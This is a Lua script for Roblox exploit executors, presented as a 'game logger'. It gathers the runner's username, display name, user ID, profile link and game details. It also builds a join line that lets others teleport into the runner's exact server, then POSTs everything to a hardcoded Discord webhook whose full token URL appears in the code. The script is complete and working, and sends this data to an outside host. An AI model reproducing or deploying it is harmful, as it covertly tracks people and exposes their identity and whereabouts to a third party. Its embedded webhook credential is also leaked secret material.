--// Minimal Game Logger with Player Name & Profile 

getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1400241735778570301/LWBMK__NGuaSM1YFjFMwDKAX8Dq7oLMvu8ilOLkGuAvs8Qkn-g3HLLqarebK8X1mEkvJ"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local gameId = game.PlaceId
local jobId = tostring(game.JobId)

-- Safely get game name
local success, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(gameId)
end)
local gameName = success and gameInfo.Name or "Unknown Game"

local playerCount = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers or "?"
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId

-- Join script for rejoining
local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

-- Webhook data
local data = {
    ["embeds"] = {{
        ["title"] = "🎮 Game Log",
        ["color"] = tonumber(0x00ccff),
        ["fields"] = {
            {
                ["name"] = "👤 Player Info",
                ["value"] = "Username: `" .. username .. "`\nDisplay Name: `" .. displayName .. "`\n[View Profile](https://www.roblox.com/users/" .. userId .. "/profile)",
                ["inline"] = false
            },
            {
                ["name"] = "🏷️ Game Name",
                ["value"] = gameName,
                ["inline"] = false
            },
            {
                ["name"] = "👥 Player Count",
                ["value"] = playerCount .. " / " .. maxPlayers,
                ["inline"] = false
            },
            {
                ["name"] = "🔗 Join Script",
                ["value"] = "Copy & paste into executor: `" .. joinScript .. "`",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = os.date("Logged at %Y-%m-%d %H:%M:%S")
        }
    }}
}

-- HTTP Request logic
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)

if not request then
    warn("Executor does not support HTTP requests.")
    return
end

local jsonData = HttpService:JSONEncode(data)
local headers = {["Content-Type"] = "application/json"}

request({
    Url = getgenv().webhookexecUrl,
    Method = "POST",
    Headers = headers,
    Body = jsonData
})
